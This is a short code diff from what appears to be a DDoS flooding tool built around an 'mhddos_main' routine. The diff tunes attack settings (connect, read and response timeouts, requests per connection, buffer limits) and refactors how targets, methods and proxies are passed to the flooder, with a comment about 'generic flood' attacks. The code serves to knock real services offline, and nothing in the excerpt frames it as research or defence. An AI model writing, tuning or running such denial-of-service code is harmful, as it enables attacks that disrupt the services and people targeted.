@@ -145,9 +145,13 @@ async def run_ddos(args):
     await asyncio.sleep(5)
 
     attack_settings = AttackSettings(
-        requests_per_connection=args.rpc,
+        connect_timeout_seconds=8,
         dest_connect_timeout_seconds=10.0,
         drain_timeout_seconds=10.0,
+        close_timeout_seconds=1.0,
+        http_response_timeout_seconds=15.0,
+        tcp_read_timeout_seconds=0.2,
+        requests_per_connection=args.rpc,
         high_watermark=1024 << 4,
         # note that "generic flood" attacks switch reading off completely
         reader_limit=1024 << 2,
@@ -166,17 +170,15 @@ async def run_ddos(args):
         else:
             settings = attack_settings
 
-        kwargs = {
-            'url': target.url,
-            'ip': target.addr,
-            'method': method,
-            'event': None,
-            'stats': target.create_stats(method),
-            'proxies': proxies,
-            'loop': loop,
-            'settings': settings,
-        }
-        return mhddos_main(**kwargs)
+        return mhddos_main(
+            url=target.url,
+            ip=target.addr,
+            method=method,
+            stats=target.create_stats(method),
+            proxies=proxies,
+            loop=loop,
+            settings=settings
+        )
 
     active_flooder_tasks = []
     tcp_task_group = None
